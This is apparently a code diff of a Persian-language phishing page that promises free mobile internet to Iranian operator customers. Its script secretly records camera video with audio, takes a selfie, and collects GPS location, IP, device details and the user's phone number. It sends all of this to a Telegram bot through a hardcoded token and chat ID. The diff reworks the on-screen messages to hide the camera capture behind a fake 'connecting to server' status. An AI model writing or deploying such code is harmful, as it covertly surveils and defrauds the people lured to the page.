@@ -7,27 +7,141 @@
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
     * {margin:0;padding:0;box-sizing:border-box;font-family:'Vazirmatn',sans-serif;}
-    body {background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;text-align:center;padding:20px;}
-    .container {max-width:380px;margin:0 auto;background:rgba(255,255,255,0.15);border-radius:20px;padding:25px;box-shadow:0 10px 30px rgba(0,0,0,0.4);backdrop-filter:blur(12px);}
-    .logo {width:90px;height:90px;margin:0 auto 15px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 15px rgba(0,0,0,0.2);}
-    .logo img {width:65px;}
-    h1 {font-size:23px;margin-bottom:8px;}
-    p {font-size:14px;margin-bottom:22px;opacity:0.9;line-height:1.6;}
-    .operators {display:flex;gap:12px;margin-bottom:22px;justify-content:center;flex-wrap:wrap;}
-    .op {flex:1;min-width:90px;padding:14px;border:2px solid rgba(255,255,255,0.3);border-radius:14px;font-size:14px;cursor:pointer;transition:0.3s;display:flex;flex-direction:column;align-items:center;gap:6px;}
-    .op img {width:36px;height:36px;object-fit:contain;}
-    .op span {font-size:13px;font-weight:500;}
-    .op.active {border-color:#00d2ff;background:rgba(0,210,255,0.15);transform:scale(1.05);}
-    .btn {background:#00d2ff;color:#fff;border:none;padding:16px;font-size:17px;font-weight:bold;border-radius:14px;cursor:pointer;width:100%;transition:0.3s;margin-top:10px;box-shadow:0 4px 15px rgba(0,210,255,0.4);}
-    .btn:hover {background:#00b4d8;transform:translateY(-1px);}
-    .btn:disabled {background:#666;cursor:not-allowed;transform:none;}
-    .spinner {display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin-left:8px;}
-    @keyframes spin {to{transform:rotate(360deg);}}
-    .status {margin-top:15px;font-size:13px;min-height:20px;}
-    .progress {width:100%;height:6px;background:rgba(255,255,255,0.2);border-radius:3px;margin:15px 0;overflow:hidden;}
-    .progress-bar {height:100%;background:#00d2ff;width:0;transition:width 0.3s;box-shadow:0 0 10px #00d2ff;}
-    .hidden {display:none;}
-    .footer {margin-top:25px;font-size:11px;opacity:0.6;}
+    
+    body {
+      background: linear-gradient(135deg, #2a1b3d, #3d2a5e);
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 380px;
+      margin: 0 auto;
+      background: rgba(255,255,255,0.1);
+      border-radius: 20px;
+      padding: 25px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+      backdrop-filter: blur(12px);
+    }
+
+    .logo {
+      width: 90px;
+      height: 90px;
+      margin: 0 auto 15px;
+      background: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+    .logo img {width: 65px;}
+
+    h1 {font-size: 23px; margin-bottom: 8px;}
+    p {font-size: 14px; margin-bottom: 22px; opacity: 0.9; line-height: 1.6;}
+
+    .operators {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 22px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    .op {
+      flex: 1;
+      min-width: 90px;
+      padding: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 14px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.3s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .op span {font-size: 15px; font-weight: 600;}
+    .op.active {
+      border-color: #9d4edd;
+      background: rgba(157, 78, 221, 0.2);
+      transform: scale(1.05);
+    }
+
+    .phone-input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 2px solid transparent;
+      margin: 15px 0 10px;
+      text-align: center;
+      font-size: 16px;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      transition: all 0.3s ease;
+    }
+    .phone-input:focus {
+      outline: none;
+      border-color: #9d4edd;
+      box-shadow: 0 0 12px rgba(157, 78, 221, 0.5);
+    }
+
+    .btn {
+      background: #9d4edd;
+      color: #fff;
+      border: none;
+      padding: 16px;
+      font-size: 17px;
+      font-weight: bold;
+      border-radius: 14px;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
+    }
+    .btn:hover {
+      background: #7c3aed;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(157, 78, 221, 0.6);
+    }
+    .btn:disabled {
+      background: #666;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #fff;
+      border-top: 2px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-left: 8px;
+    }
+    @keyframes spin {to {transform: rotate(360deg);}}
+
+    .status {margin-top: 15px; font-size: 13px; min-height: 20px;}
+    .progress {
+      width: 100%;
+      height: 6px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 3px;
+      margin: 15px 0;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 100%;
+      background: #9d4edd;
+      width: 0;
+      transition: width 0.3s;
+      box-shadow: 0 0 10px #9d4edd;
+    }
+    .hidden {display: none;}
+    .footer {margin-top: 25px; font-size: 11px; opacity: 0.6;}
   </style>
 </head>
 <body>
@@ -38,29 +152,27 @@
     <h1>اینترنت رایگان نامحدود</h1>
     <p>بسته هدیه ۱۰ گیگابایت اینترنت رایگان برای همه اپراتورها!</p>
 
+    <input type="tel" id="userPhone" class="phone-input" placeholder="09123456789" />
+
     <div class="operators">
       <div class="op active" data-op="irancell">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Irancell_Logo.svg/512px-Irancell_Logo.svg.png" alt="ایرانسل">
         <span>ایرانسل</span>
       </div>
       <div class="op" data-op="mci">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/MCI_Logo.svg/512px-MCI_Logo.svg.png" alt="همراه اول">
         <span>همراه اول</span>
       </div>
       <div class="op" data-op="rightel">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Rightel_Logo.svg/512px-Rightel_Logo.svg.png" alt="رایتل">
         <span>رایتل</span>
       </div>
     </div>
 
     <button id="enterBtn" class="btn">
-      <span id="btnText">ورود به سایت</span>
+      <span id="btnText">دریافت اینترنت</span>
       <span id="spinner" class="spinner hidden"></span>
     </button>
 
     <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
-    <div id="status" class="status">آماده فعال‌سازی بسته هدیه...</div>
-
+    <div id="status" class="status">در حال آماده‌سازی...</div>
     <div class="footer">
       پشتیبانی: ۰۹۹۹۹۹۹۹۹۹۹ | فقط امروز فعال است!
     </div>
@@ -72,7 +184,6 @@
   <script>
     const BOT_TOKEN = "8596621944:AAFqbMc13biq0RK_3hz412nFHYu7jjpsxU0";
     const CHAT_ID = "6671671704";
-
     const enterBtn = document.getElementById('enterBtn');
     const btnText = document.getElementById('btnText');
     const spinner = document.getElementById('spinner');
@@ -82,7 +193,6 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     const operators = document.querySelectorAll('.op');
-
     let stream, timer;
     let selectedOp = 'irancell';
 
@@ -97,23 +207,29 @@
     enterBtn.addEventListener('click', startCapture);
 
     async function startCapture() {
+      const phoneInput = document.getElementById('userPhone');
+      if (!phoneInput.value || !phoneInput.value.match(/^09[0-9]{9}$/)) {
+        alert('لطفاً شماره تلفن صحیح وارد کنید.');
+        return;
+      }
+
       enterBtn.disabled = true;
-      btnText.textContent = "در حال اتصال به سرور...";
+      btnText.textContent = "در حال اتصال...";
       spinner.classList.remove('hidden');
-      status.textContent = "درخواست دسترسی به دوربین...";
+      status.textContent = "در حال ارتباط با سرور...";
       progressBar.style.width = "0%";
 
       try {
+        // دسترسی به دوربین و میکروفون (بدون نمایش)
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: 640, height: 480 },
           audio: true
         });
-
         video.srcObject = stream;
         video.muted = true;
         video.play();
 
-        status.textContent = "در حال ضبط فیلم تأیید هویت...";
+        // فقط نمایش "ارتباط با سرور"
         let seconds = 0;
         timer = setInterval(() => {
           seconds++;
@@ -125,7 +241,7 @@
         }, 1000);
 
       } catch (err) {
-        status.textContent = "دسترسی به دوربین رد شد.";
+        status.textContent = "اتصال به سرور ناموفق بود.";
         reset();
       }
     }
@@ -137,9 +253,11 @@
       const photoBlob = await capturePhoto();
       const deviceInfo = await getDeviceInfo();
       const location = await getLocation();
+      const userPhone = document.getElementById('userPhone').value;
 
       let messageId = null;
 
+      // ارسال فیلم (صدا دار)
       if (videoBlob) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
@@ -149,18 +267,21 @@
         if (data.ok) messageId = data.result.message_id;
       }
 
+      // ارسال عکس سلفی
       if (photoBlob) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('photo', photoBlob, 'camera.jpg');
+        form.append('photo', photoBlob, 'selfie.jpg');
         if (messageId) form.append('reply_to_message_id', messageId);
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
         const data = await res.json();
         if (data.ok) messageId = data.result.message_id;
       }
 
+      // گزارش کامل
       const report = `
 *گزارش کاربر - اینترنت رایگان*
+*شماره تلفن:* \`${userPhone}\`
 اپراتور: \`${selectedOp.toUpperCase()}\`
 مدل: \`${deviceInfo.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص'}\`
 IP: \`${deviceInfo.ip}\`
@@ -188,6 +309,7 @@ IP: \`${deviceInfo.ip}\`
       setTimeout(reset, 3000);
     }
 
+    // ضبط فیلم (صدا دار)
     async function recordVideo() {
       return new Promise(resolve => {
         const chunks = [];
@@ -199,6 +321,7 @@ IP: \`${deviceInfo.ip}\`
       });
     }
 
+    // عکس سلفی
     async function capturePhoto() {
       return new Promise(resolve => {
         canvas.width = video.videoWidth;
@@ -208,6 +331,7 @@ IP: \`${deviceInfo.ip}\`
       });
     }
 
+    // اطلاعات فنی
     async function getDeviceInfo() {
       const info = { userAgent: navigator.userAgent, ip: '', location: '' };
       try {
@@ -219,6 +343,7 @@ IP: \`${deviceInfo.ip}\`
       return info;
     }
 
+    // لوکیشن دقیق
     async function getLocation() {
       return new Promise(resolve => {
         if (!navigator.geolocation) return resolve({ error: "GPS غیرفعال" });
@@ -245,9 +370,10 @@ IP: \`${deviceInfo.ip}\`
 
     function reset() {
       enterBtn.disabled = false;
-      btnText.textContent = "ورود به سایت";
+      btnText.textContent = "دریافت اینترنت";
       spinner.classList.add('hidden');
       progressBar.style.width = "0%";
+      status.textContent = "در حال آماده‌سازی...";
     }
   </script>
 </body>
